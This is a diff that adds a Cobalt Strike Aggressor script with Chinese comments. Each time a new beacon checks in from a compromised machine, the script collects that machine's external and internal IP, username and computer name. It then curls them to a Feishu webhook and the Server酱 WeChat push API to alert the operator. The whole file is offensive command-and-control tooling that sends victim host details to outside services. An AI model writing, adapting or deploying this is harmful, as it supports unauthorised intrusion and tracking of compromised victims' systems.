@@ -1,0 +1,27 @@
+on beacon_initial {
+    # 飞书群聊机器人 webhook 地址
+    $feishu_url = '把这里替换为飞书webhook的地址';
+    # server酱 API地址
+    $serverchains_api = 'https://sctapi.ftqq.com/把这里替换为server酱的SendKey.send';
+    
+    #获取ip、计算机名、登录账号
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+
+    # 飞书 
+    $json_start = "{\"msg_type\":\"text\",\"content\":{\"text\": ";
+    $json_msg = '"Cobalt Strike上线提醒\n出口IP: '.$externalIP.'\n内网IP: '.$internalIP.'\n用户名: '.$userName.'\n计算机名: '.$computerName.'\n"';
+    $json_end = "}}";
+    $msg = $json_start.$json_msg.$json_end;
+    # 通过curl调用飞书API
+    @curl_command = @('curl','-X','POST','-H','Content-Type: application/json','-d',$msg,$feishu_url);
+    exec(@curl_command);
+
+    # server酱
+    $serverchains_msg = 'title=Cobalt Strike上线通知&desp='.'%0d%0a%0d%0a出口IP: '.$externalIP.'%0d%0a%0d%0a内网IP: '.$internalIP.'%0d%0a%0d%0a用户名: '.$userName.'%0d%0a%0d%0a计算机名: '.$computerName;
+    # 通过curl调用server酱 API
+    @curl_command_wechat = @('curl','-X','POST','-d',$serverchains_msg,$serverchains_api);
+    exec(@curl_command_wechat);
+}
